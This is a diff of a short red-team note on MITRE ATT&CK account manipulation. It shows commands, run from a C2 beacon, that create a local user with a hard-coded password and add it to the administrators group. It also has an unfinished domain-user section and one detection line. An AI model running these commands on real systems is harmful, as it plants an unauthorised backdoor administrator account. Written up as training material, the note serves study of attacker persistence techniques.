@@ -1,12 +1,12 @@
 # [Account Manipulation](https://attack.mitre.org/techniques/T1098/)
 
-## Exploit syntax:
-1. Get a beacon with administrative privileges.
+## LOCAL USER Exploit syntax:
+1. Get a beacon with local/domain administrative privileges.
 
 2. In parrot open a blank text file and paste the following commands into it
-    ```sh
-    net user /add ryan;
-    net localgroup administrators /add ryan;
+    ```powershell
+    net user /add Gearhead Squanch123;
+    net localgroup administrators /add Gearhead;
     ```
 
 3. Save the file with as Pencilvester.ps1 to /tmp
@@ -17,9 +17,13 @@
 	```
 
 5.  In posh, run
-    ```sh
+    ```powershell
 	pslo /tmp/Pencilvester.ps1
     ```
+
+## DOMAIN USER Exploit syntax: 
+????????????????????
+new-aduser ain't fucking working
 
 ## Detection Technique:
 * Monitor windows events related to account manipulation
